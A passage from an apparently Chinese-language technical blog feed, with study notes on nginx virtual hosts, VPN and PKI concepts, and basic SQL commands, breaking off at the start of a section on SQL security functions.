class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">   listen 80;</span><br><span class="line">   server_name bbs.yong.com;</span><br><span class="line">   index index.html;</span><br><span class="line">   root /data/bbs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>验证结果，使用curl测试，或者浏览器输入域名访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -xlocalhost:80 www.xxxxx.com</span><br><span class="line"></span><br><span class="line">this is yong linux</span><br><span class="line"></span><br><span class="line">curl -xlocalhost:80 bbs.yong.com</span><br><span class="line"></span><br><span class="line">this is yong bbs</span><br></pre></td></tr></table></figure></p><h4 id="2、基于端口的虚拟主机配置"><a href="#2、基于端口的虚拟主机配置" class="headerlink" title="2、基于端口的虚拟主机配置:"></a>2、基于端口的虚拟主机配置:</h4><p>使用端口来区分，浏览器使用域名或ip地址:端口号 访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 8000;</span><br><span class="line">    server_name www.xxxxx.com;</span><br><span class="line">    root /data/www;</span><br><span class="line">&#125;</span><br><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 8001;</span><br><span class="line">    server_name www.xxxxxx.com;</span><br><span class="line">    root /data/bbs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>验证结果，使用curl测试，或者浏览器输入域名访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl www.xxxxx.com:8000</span><br><span class="line"></span><br><span class="line">this is yong linux</span><br><span class="line"></span><br><span class="line">curl www.xxxx.com:8001</span><br><span class="line"></span><br><span class="line">this is yong bbs</span><br></pre></td></tr></table></figure></p><h4 id="3、基于ip地址的虚拟主机配置"><a href="#3、基于ip地址的虚拟主机配置" class="headerlink" title="3、基于ip地址的虚拟主机配置:"></a>3、基于ip地址的虚拟主机配置:</h4><p>通过ip来访问，需要配置多个ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0:1 192.168.22.21</span><br><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 192.168.20.20:80;</span><br><span class="line">    server_name www.xxxxx.com;</span><br><span class="line">    root /data/www;</span><br><span class="line">&#125;</span><br><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 192.168.20.21:80;</span><br><span class="line">    server_name www.xxxxx.com;</span><br><span class="line">    root /data/bbs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>验证结果，使用curl测试，或者浏览器输入域名访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.22.20</span><br><span class="line"></span><br><span class="line">this is yong linux</span><br><span class="line"></span><br><span class="line">curl 192.168.22.21</span><br><span class="line"></span><br><span class="line">this is yong bbs</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="http://yoursite.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>VPN</title>
    <link href="http://yoursite.com/2018/09/03/VPN/"/>
    <id>http://yoursite.com/2018/09/03/VPN/</id>
    <published>2018-09-03T01:49:05.000Z</published>
    <updated>2018-09-03T03:27:53.105Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-193.png" alt="upload successful"></p><h1 id="VPN产生背景"><a href="#VPN产生背景" class="headerlink" title="VPN产生背景"></a>VPN产生背景</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">企业、组织、商家等对专用网有强大的需求</span><br><span class="line"></span><br><span class="line">高性能、 高速度和高安全性是专用网明显的优势</span><br><span class="line"></span><br><span class="line">物理专用网价格高昂，物理架设实施有难度。 传统的通过租用专线或拨号网络的方式越来越不适用。 （性价比较低）</span><br><span class="line"></span><br><span class="line">TCP/IP 协议簇本身的局限性，不能保证信息直接传输的保密性。 TCP/IP协议在设计之初是基于可信环境的，没有考虑安全问题，所以在TCP/IP协议簇本身存在许多固有的安全缺陷</span><br></pre></td></tr></table></figure><p><img src="\images\pasted-194.png" alt="upload successful"></p><h1 id="VPN定义"><a href="#VPN定义" class="headerlink" title="VPN定义"></a>VPN定义</h1><p>（Vitual Private Network，虚拟私有网）：是指依靠ISP或其他NSP在公用网络基础设施之上构建的专用的安全数据通信网络，只不过这个专线网络是逻辑上的而不是物理的，所以称为虚拟专用网</p><h5 id="虚拟："><a href="#虚拟：" class="headerlink" title="虚拟："></a>虚拟：</h5><p>用户不再需要拥有实际的长途数据线路，而是使用公共网络资源建立自己的私有网络</p><h5 id="专用："><a href="#专用：" class="headerlink" title="专用："></a>专用：</h5><p>用户可以定制最符合自身需求的网络</p><h5 id="核心技术："><a href="#核心技术：" class="headerlink" title="核心技术："></a>核心技术：</h5><p>隧道技术</p><h1 id="VPN分类"><a href="#VPN分类" class="headerlink" title="VPN分类"></a>VPN分类</h1><h4 id="按业务类型"><a href="#按业务类型" class="headerlink" title="按业务类型"></a>按业务类型</h4><ol><li><p>Client-LAN VPN（Acceess VPN）</p><p>使用基于Internet远程访问的 VPN</p><p>出差在外的员工、 有远程办公需要的分支机构，都可以利用这种类型的 VPN ，实现对<br>企业内部网络资源进行安全地远程访问</p></li></ol><p><img src="\images\pasted-195.png" alt="upload successful"></p><ol start="2"><li><p>LAN-LAN VPN</p><p>为了在不同局域网络之间建立安全的数据传输通道，例如在企业内部各分支机构之间<br>或者企业与其合作者之间的网络进行互联，则可以采用 LAN－LAN 类型的 VPN 。</p></li></ol><p><img src="\images\pasted-196.png" alt="upload successful"></p><h4 id="按网络层次分类"><a href="#按网络层次分类" class="headerlink" title="按网络层次分类"></a>按网络层次分类</h4><p><img src="\images\pasted-197.png" alt="upload successful"></p><h1 id="VPN常用技术"><a href="#VPN常用技术" class="headerlink" title="VPN常用技术"></a>VPN常用技术</h1><p><img src="\images\pasted-198.png" alt="upload successful"></p><h3 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h3><h5 id="隧道："><a href="#隧道：" class="headerlink" title="隧道："></a>隧道：</h5><p>是在公共通信网络上构建的一条数据路径，可以提供与专用通信线路等同的连接特性。</p><h5 id="隧道技术："><a href="#隧道技术：" class="headerlink" title="隧道技术："></a>隧道技术：</h5><p>是指在隧道的两端通过封装以及解封装技术在公网上建立一条数据通道，使用这条通道对数据报文进行传输。 隧道是由隧道协议构建形成的。 隧道技术是VPN技术中最关键的技术。</p><p><img src="\images\pasted-199.png" alt="upload successful"></p><h3 id="多种隧道技术比较"><a href="#多种隧道技术比较" class="headerlink" title="多种隧道技术比较"></a>多种隧道技术比较</h3><p><img src="\images\pasted-200.png" alt="upload successful"></p><h3 id="加解密技术"><a href="#加解密技术" class="headerlink" title="加解密技术"></a>加解密技术</h3><p>目的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">即使信息被窃听或者截取，攻击者也无法知晓信息的真实内容。 可以对抗网络攻击中的被动攻击。</span><br><span class="line"></span><br><span class="line">通常使用加密机制来保护信息的保密性，防止信息泄密。 信息的加密机制通常是建立在`密码学的基础上</span><br></pre></td></tr></table></figure></p><h3 id="密码学基础"><a href="#密码学基础" class="headerlink" title="密码学基础"></a>密码学基础</h3><p>从明文到密文的过程一般是通过加密算法加密进行的。<br>• 从变密文到明文，称为脱密（解密）变换。</p><h5 id="主流加密算法分为："><a href="#主流加密算法分为：" class="headerlink" title="主流加密算法分为："></a>主流加密算法分为：</h5><p>对称加密算法<br>非对称加密算法（公钥加密算法）</p><h5 id="对称加密："><a href="#对称加密：" class="headerlink" title="对称加密："></a>对称加密：</h5><p>加密和解密的密钥相同</p><h5 id="对称算法的缺陷"><a href="#对称算法的缺陷" class="headerlink" title="对称算法的缺陷"></a>对称算法的缺陷</h5><ol><li>密钥传输风险：消息传递的通信链路是不安全的</li><li>密钥多难管理</li></ol><h5 id="常见的对称加密算法"><a href="#常见的对称加密算法" class="headerlink" title="常见的对称加密算法"></a>常见的对称加密算法</h5><p><img src="\images\pasted-201.png" alt="upload successful"></p><h5 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h5><p>加密和解密使用的是不同的密钥（公钥、 私钥），两个密钥之间存在着<br>相互依存关系：用其中任一个密钥加密的信息只能用另一个密钥进行解<br>密：<br>即用公钥加密，用私钥解密就可以得到明文；<br>如果用私钥加密，用公钥解密也可以得到原来的明文<br>这使得通信双方无需事先交换密钥就可进行保密通信。</p><h5 id="非对称加密过程"><a href="#非对称加密过程" class="headerlink" title="非对称加密过程"></a>非对称加密过程</h5><p><img src="\images\pasted-202.png" alt="upload successful"></p><h5 id="常见的非对称加密算法"><a href="#常见的非对称加密算法" class="headerlink" title="常见的非对称加密算法"></a>常见的非对称加密算法</h5><p><img src="\images\pasted-203.png" alt="upload successful"></p><h5 id="非对称与对称算法的比较"><a href="#非对称与对称算法的比较" class="headerlink" title="非对称与对称算法的比较"></a>非对称与对称算法的比较</h5><p><img src="\images\pasted-204.png" alt="upload successful"></p><p>综上所述：<br>（1）数据传输采用对称加密算法；<br>（2）对称加密的密钥通过非对称加密算法进行加解密。</p><h3 id="身份认证技术"><a href="#身份认证技术" class="headerlink" title="身份认证技术"></a>身份认证技术</h3><h5 id="身份认证："><a href="#身份认证：" class="headerlink" title="身份认证："></a>身份认证：</h5><p>通过标识和鉴别用户的身份，防止攻击者假冒合法用户来获取访问权限。</p><h5 id="身份认证技术："><a href="#身份认证技术：" class="headerlink" title="身份认证技术："></a>身份认证技术：</h5><p>是在网络中确认操作者身份的过程而产生的有效解决方法。</p><h3 id="PKI体系"><a href="#PKI体系" class="headerlink" title="PKI体系"></a>PKI体系</h3><p>PKI（公开密钥体系，Public Key Infrastructure）是一种遵循标准的利用非对称加密技术为电子商务的开展提供一套安全基础平台的技术和规范。</p><p>简单来说，PKI就是利用公钥理论和技术建立的提供安全服务的基础设施。 用户可利用PKI平台提供的服务进行安全的电子交易、 通信和互联网上的各种活动。</p><p>PKI 技术采用证书管理公钥，通过第三方的可信任机构——CA认证中心把用户的公钥和用户的其他标识信息捆绑在一起放在用户证书中，在互联网上验证用户的身份。</p><p>目前，通用的办法是采用建立在PKI基础之上的数字证书，通过把要传输的数字信息进行加密和签名，保证信息传输的机密性、 真实性、 完整性和不可否认性，从而保证信息的安全传输。</p><h3 id="PKI体系组成"><a href="#PKI体系组成" class="headerlink" title="PKI体系组成"></a>PKI体系组成</h3><p>PKI是创建、 颁发、 管理、 注销公钥证书所涉及到的所有软件、 硬件的集合体。 其核心元素是数字证书，核心执行者是CA认证机构。</p><p><img src="\images\pasted-205.png" alt="upload successful"></p><h3 id="CA中心"><a href="#CA中心" class="headerlink" title="CA中心"></a>CA中心</h3><p>CA中心，即证书授权中心(Certificate Authority )，或称证书授权机构，作为电子商务交易中受信任的第三方。</p><p>CA中心的作用：签发证书、 规定证书的有效期和通过发布证书废除列表（CRL）确保必要时可以废除证书，以及对证书和密钥进行管理。<br>• CA中心为每个使用公开密钥的用户发放一个数字证书，数字证书的作用是证明证书中列出的用户合法拥有证书中列出的公钥。<br>• CA中心的数字签名使得攻击者不能伪造和篡改证书。</p><p><img src="\images\pasted-206.png" alt="upload successful"></p><h3 id="数字证书认证技术原理"><a href="#数字证书认证技术原理" class="headerlink" title="数字证书认证技术原理"></a>数字证书认证技术原理</h3><h5 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h5><p>一个经证书授权中心数字签名的包含公开密钥拥有者信息和公开密钥的文件</p><p>数字证书是一般包含：<br>• 用户身份信息<br>• 用户公钥信息<br>• 身份验证机构数字签名的数据<br>从证书用途来看，数字证书可分为签名证书和加密证书。</p><p><img src="\images\pasted-207.png" alt="upload successful"></p><h5 id="签名证书："><a href="#签名证书：" class="headerlink" title="签名证书："></a>签名证书：</h5><p>主要用于对用户信息进行签名，以保证信息的真实性和不可否认性。</p><h5 id="加密证书："><a href="#加密证书：" class="headerlink" title="加密证书："></a>加密证书：</h5><p>主要用于对用户传送的信息进行加密，以保证信息的机密性和完整性。</p><h5 id="数字证书："><a href="#数字证书：" class="headerlink" title="数字证书："></a>数字证书：</h5><p>互联网通讯中标志通讯各方身份信息的一系列数据，它由CA机构中心发行，用来识别对方的身份。</p><h5 id="根证书："><a href="#根证书：" class="headerlink" title="根证书："></a>根证书：</h5><p>根证书是CA认证中心给自己颁发的证书，是信任链的起始点。根证书是一份特殊的证书，它的签发者是它本身，下载根证书表示对该根证书以下所签发的证书都表示信任。</p><h5 id="用户证书："><a href="#用户证书：" class="headerlink" title="用户证书："></a>用户证书：</h5><p>由CA中心签发的个人证书，用于识别、 鉴定终端用户，可存于USB-KEY等介质。</p><h5 id="设备证书："><a href="#设备证书：" class="headerlink" title="设备证书："></a>设备证书：</h5><p>也称服务器证书，该证书将安装在服务器端，向尝试建立连接的客户端提供服务器身份、 证书和公钥信息，使用证书和公钥在客户端和服务端之间建立一条安全、 加密的通道，将通信两端的数据进行加密传输</p><h3 id="数据安全案例"><a href="#数据安全案例" class="headerlink" title="数据安全案例"></a>数据安全案例</h3><p><img src="\images\pasted-208.png" alt="upload successful"></p><h3 id="数据安全案例-HTTPS"><a href="#数据安全案例-HTTPS" class="headerlink" title="数据安全案例-HTTPS"></a>数据安全案例-HTTPS</h3><p>HTTP是常用的web协议，用来交互网页数据。</p><p>由于HTTP是不加密的，在公网上明文传输，缺少保密性。 所以出现了安全加密的HTTP协议—HTTPS协议。</p><p>HTTPS是在SSL协议基础上的HTTP协议。</p><p>SSL协议的握手过程需要传输服务器的证书，并验证证书的可靠性。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="网络" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="网络" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>SQL基础</title>
    <link href="http://yoursite.com/2018/09/02/SQL%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2018/09/02/SQL基础/</id>
    <published>2018-09-02T13:52:05.000Z</published>
    <updated>2018-09-02T14:13:40.875Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-192.png" alt="upload successful"></p><h1 id="SQL概述"><a href="#SQL概述" class="headerlink" title="SQL概述"></a>SQL概述</h1><h4 id="什么是SQL"><a href="#什么是SQL" class="headerlink" title="什么是SQL"></a>什么是SQL</h4><p>(Structured Query Language)简称SQL。是一种特殊目的的编程语言，是一种结构化查询语言与数据库进行交互的程序设计语言</p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>用于存取数据以及查询、更新和管理关系型数据库</p><h4 id="数据库的分类"><a href="#数据库的分类" class="headerlink" title="数据库的分类"></a>数据库的分类</h4><h5 id="关系型："><a href="#关系型：" class="headerlink" title="关系型："></a>关系型：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql、Oracle、DB2、sqlserver、Access</span><br></pre></td></tr></table></figure><h5 id="非关系型NOSQL"><a href="#非关系型NOSQL" class="headerlink" title="非关系型NOSQL"></a>非关系型NOSQL</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MongDB、Redis、Neo4j</span><br></pre></td></tr></table></figure><p>总的来说，关系型数据库比较安全，非关系型性能好</p><h1 id="SQL命令"><a href="#SQL命令" class="headerlink" title="SQL命令"></a>SQL命令</h1><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><h5 id="数据控制语言"><a href="#数据控制语言" class="headerlink" title="数据控制语言"></a>数据控制语言</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">授权grant</span><br><span class="line">权限收回 remove</span><br><span class="line">数据提交commit</span><br><span class="line">回滚 rollback</span><br></pre></td></tr></table></figure><h5 id="数据定义语言"><a href="#数据定义语言" class="headerlink" title="数据定义语言"></a>数据定义语言</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create</span><br><span class="line">alter</span><br><span class="line">drop</span><br><span class="line">用于管理库、表</span><br></pre></td></tr></table></figure><h5 id="数据操作语言"><a href="#数据操作语言" class="headerlink" title="数据操作语言"></a>数据操作语言</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">insert</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">针对表里的数据进行操作</span><br></pre></td></tr></table></figure><h3 id="DCL常用"><a href="#DCL常用" class="headerlink" title="DCL常用"></a>DCL常用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">创建用户</span><br><span class="line">CREATE USER username IDENTIFIED BY &apos;password’;</span><br><span class="line">用户授权</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &apos;username&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;password’;</span><br><span class="line">撤销授权</span><br><span class="line">revoke all on *.* from username@localhost;</span><br><span class="line"></span><br><span class="line">查看用户的权限</span><br><span class="line">select host,user,password from user;</span><br><span class="line"></span><br><span class="line">删除用户</span><br><span class="line"></span><br><span class="line">DROP USER username;</span><br></pre></td></tr></table></figure><h3 id="DDL常用语句"><a href="#DDL常用语句" class="headerlink" title="DDL常用语句"></a>DDL常用语句</h3><h5 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常用命令：</span><br><span class="line">【show databases】 : 查看所有数据库</span><br><span class="line">【use db_name】：进入数据库</span><br><span class="line">【create databse db_name】：创建数据库</span><br><span class="line">【show create database db_name】：显示数据库创建信息</span><br><span class="line">【drop database db_name】：删除数据库</span><br><span class="line">【 show global variables】：显示所有全局变量</span><br><span class="line">常用函数：</span><br><span class="line">【select user()】：显示当前使用连接数据库的用户</span><br><span class="line">【select database()】：显示当前连接的数据库</span><br><span class="line">【select version()】：显示当前数据库的版本</span><br></pre></td></tr></table></figure><h5 id="数据表层面："><a href="#数据表层面：" class="headerlink" title="数据表层面："></a>数据表层面：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">创建表： </span><br><span class="line">CREATE TABLE tablename(</span><br><span class="line">column_name_1 column_type_1 constraints,</span><br><span class="line">column_name_2 column_type_2 constraints,</span><br><span class="line">......</span><br><span class="line">column_name_n column_type_n constraints,</span><br><span class="line">PRIMARY KEY (`column_name_n`),</span><br><span class="line">Index `index_name` (`column_name_n`)</span><br><span class="line">) ENGINE= ENGINE_TYPE DEFAULT CHARSET= CHARSET_TYPE;</span><br><span class="line"></span><br><span class="line">查看表结构： </span><br><span class="line">DESC tablename;</span><br><span class="line">查看创建表的SQL语句</span><br><span class="line">SHOW CREATE TABLE tablename;</span><br><span class="line">删除表：</span><br><span class="line">DROP TABLE tablename;</span><br><span class="line"></span><br><span class="line">修改表字段：</span><br><span class="line">ALTER TABLE tablename MODIFY [COLUMN] column_definition [FIRST | AFTER col_name];</span><br><span class="line">删除表字段：</span><br><span class="line">ALTER TABLE tablename DROP [COLUMN];</span><br><span class="line">增加表字段：</span><br><span class="line">ALTER TABLE tablename ADD [COLUMN] column_definition [FIRST | AFTER col_name];</span><br></pre></td></tr></table></figure><h3 id="DML常用语句"><a href="#DML常用语句" class="headerlink" title="DML常用语句"></a>DML常用语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">插入记录： </span><br><span class="line">INSERT INTO tablename(field1,field2,......fieldn) VALUES(value1,value2,......valuesn);</span><br><span class="line">例：insert into student (student_id,student_name,sex,email,province,city,register_date,createTime,updateTime) values (null,&quot;张三&quot;,&quot;1&quot;,&quot;12345@qq.com&quot;,&quot;北京&quot;,&quot;北京&quot;,current_date(),now(),now());</span><br><span class="line"></span><br><span class="line">更新记录：</span><br><span class="line">UPDATE tablename SET field1=value1,field2=value2,......fieldn=valuen [WHERE CONDITION];</span><br><span class="line"></span><br><span class="line">删除记录：</span><br><span class="line">DELETE FROM tablename [WHERE CONDITION];</span><br><span class="line"></span><br><span class="line">提交/回滚：</span><br><span class="line">在对数据表进行更改操作后、要进行提交（commit）或者回滚（rollback）操作</span><br><span class="line"></span><br><span class="line">查询记录： </span><br><span class="line"></span><br><span class="line">   条件查询：</span><br><span class="line"></span><br><span class="line">SELECT field1… FROM tablename   and (CONDITION2 or CONDITION3);   WHERE CONDITION1  </span><br><span class="line"></span><br><span class="line">  排序和限制：</span><br><span class="line"></span><br><span class="line">SELECT * FROM tablename </span><br><span class="line"></span><br><span class="line">[WHERE CONDITION] </span><br><span class="line"></span><br><span class="line">[ORDER BY field1 [DESC|ASC], field2 [DESC|ASC],...fieldn [DESC|ASC]];</span><br><span class="line"></span><br><span class="line">【DESC】和【ASC】为排序关键字：</span><br><span class="line"></span><br><span class="line">【DESC】表示按照字段进行降序排列（上大-下小）</span><br><span class="line"></span><br><span class="line">【ASC】则表示升序排列（上小-下大）</span><br><span class="line"></span><br><span class="line">默认是按照字段升序进行排列</span><br></pre></td></tr></table></figure><p>SELECT语句中常用的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">CONCAT：将多个字符串连接成一个字符串。</span><br><span class="line">CONCAT_WS：是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位  置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是  其它参数。</span><br><span class="line"></span><br><span class="line">GROUP_CONCAT：group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排  序字段] [Separator &apos;分隔符&apos;])</span><br><span class="line"></span><br><span class="line">AVG () ：返回数值列的平均值。NULL 值不包括在计算中。</span><br><span class="line"></span><br><span class="line">COUNT() ：返回指定列的值的数目（NULL 不计入）。</span><br><span class="line"></span><br><span class="line">MAX()：返回一列中的最大值。NULL 值不包括在计算中。</span><br><span class="line"></span><br><span class="line">MIN()：返回一列中的最小值。NULL 值不包括在计算中。</span><br><span class="line"></span><br><span class="line">SUM()：返回数值列的总数（总额）。</span><br><span class="line"></span><br><span class="line">LENGTH()：返回文本字段中值的长度。</span><br><span class="line"></span><br><span class="line">ROUND(column_name,decimals)：用于把数值字段舍入为指定的小数位数。</span><br><span class="line"></span><br><span class="line">FORMAT()：用于对字段的显示进行格式化。</span><br><span class="line"></span><br><span class="line">FIRST()：返回指定的字段中第一个记录的值。</span><br><span class="line"></span><br><span class="line">LAST()：返回指定的字段中最后一个记录的值。</span><br><span class="line"></span><br><span class="line">UCASE () ：把字段的值转换为大写。</span><br><span class="line"></span><br><span class="line">LCASE () ：把字段的值转换为小写。</span><br><span class="line"></span><br><span class="line">DISTINCT : 用于返回唯一不同的值。</span><br></pre></td></tr></table></figure></p><p>表连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">当需要同时显示多个表中的字段时，就可以用表连接来实现，这样的功能。</span><br><span class="line">从大类上分，表连接分为以下4类：</span><br><span class="line"></span><br><span class="line">【内连接】：仅选出两张表中互相匹配的记录</span><br><span class="line">【左连接】：包含所有的左边表中的记录甚至是右边表中没有和它匹配的记录</span><br><span class="line">【右连接】：包含所有的右边表中的记录甚至是左边表中没有和它匹配的记录</span><br><span class="line">【外连接】：两边表中的内容全部显示</span><br></pre></td></tr></table></figure></p><p>联合查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">将两个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示出来，这个时候，就需要用到union和union all关键字来实现这样的功能，具体语法如下：</span><br><span class="line">SELECT * FROM t1</span><br><span class="line">UNION|UNION ALL</span><br><span class="line">SELECT * FROM t2</span><br><span class="line">......</span><br><span class="line">UNION|UNION ALL</span><br><span class="line">SELECT * FROM tn;</span><br><span class="line"></span><br><span class="line">UNION 和 UNION ALL的主要区别是 UNION ALL 是把结果集直接合并在一起，而UNION是将UNION ALL后的结果进行一次DISTINCT，去除重复记录后的结果。</span><br></pre></td></tr></table></figure></p><h1 id="SQL安全相关"><a href="#SQL安全相关" class="headerlink" title="SQL安全相关"></a>SQL安全相关</h1><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>mysql_real_escape_string()(PHP)过滤特殊字符串:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">这个函数进行字符转义，是为了使数据安全的插入到数据库中而进行过滤</span><br><span 